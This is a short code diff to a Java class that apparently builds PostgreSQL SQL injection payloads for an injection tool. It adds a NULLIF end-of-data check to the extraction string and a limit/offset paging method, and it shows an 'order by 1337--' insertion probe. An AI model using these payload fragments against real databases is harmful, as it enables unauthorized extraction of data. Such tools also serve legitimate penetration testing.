@@ -214,11 +214,14 @@ public class PostgreSQLStrategy implements ISQLStrategy {
     public String normalStrategy(String sqlQuery, String startPosition) {
         return 
             "select+" +
-                "'SQLi'||substr(" +
+                /**
+                 * If reach end of string (SQLii) then NULLIF nullifies the result
+                 */
+                "'SQLi'||NULLIF(substr(" +
                     "(" + sqlQuery + ")," +
                     startPosition + "," +
                     "65536" +
-                ")";
+                "),'i')";
     }
 
     @Override
@@ -248,6 +251,12 @@ public class PostgreSQLStrategy implements ISQLStrategy {
     @Override
     public String insertionCharacterQuery() {
         return "+order+by+1337--+";
+    }
+
+    @Override
+    public String getLimit(Integer limitSQLResult) {
+//        return "+limit+" + limitSQLResult + ",65536";
+        return "+limit+65536+offset+" + limitSQLResult;
     }
 
 }
